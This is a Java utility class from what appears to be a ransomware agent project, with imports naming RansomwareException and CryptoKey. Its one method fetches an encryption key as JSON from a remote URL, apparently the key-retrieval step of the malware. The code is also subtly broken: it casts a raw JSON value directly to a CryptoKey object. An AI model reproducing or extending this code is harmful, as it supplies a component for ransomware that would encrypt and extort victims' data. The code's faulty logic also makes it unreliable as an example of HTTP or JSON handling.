package Agent.Utils;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

import org.json.JSONException;
import org.json.JSONObject;

import Agent.entites.CryptoKey;
import Agent.exceptions.HttpResException;
import Agent.exceptions.InOutException;
import Agent.exceptions.JsonException;
import Agent.exceptions.RansomwareException;

public class HttpUtil {
	public static CryptoKey getKey(String urlToRead) throws RansomwareException {
		StringBuilder sb = new StringBuilder();
		HttpURLConnection conn = null;
		URL url;
		int httpCode = 0;
		try {
			url = new URL(urlToRead);
			conn = (HttpURLConnection) url.openConnection();
			conn.setRequestMethod("GET");
			httpCode = conn.getResponseCode();
			System.out.println("code - " + httpCode);
		} catch (IOException e) {
			throw new InOutException("connection failed", e.getCause());
		}
		if (httpCode >= 200 && httpCode < 300) {
			try (BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream()));) {
				String line;
				while ((line = rd.readLine()) != null) {
					sb.append(line);
					System.out.println(line);
				}
				JSONObject json = new JSONObject(sb.toString());
				return (CryptoKey) json.get("CryptoKey");

			} catch (IOException e) {
				throw new InOutException("headers problem", e.getCause());
			} catch (JSONException e) {
				throw new JsonException("JSON cant find any CryptoKey", e.getCause());
			}
		} else if (httpCode >= 400 && httpCode < 500) {
			throw new HttpResException("page does not exist");
		} else {
			throw new HttpResException("server fucked up");
		}
	}
}
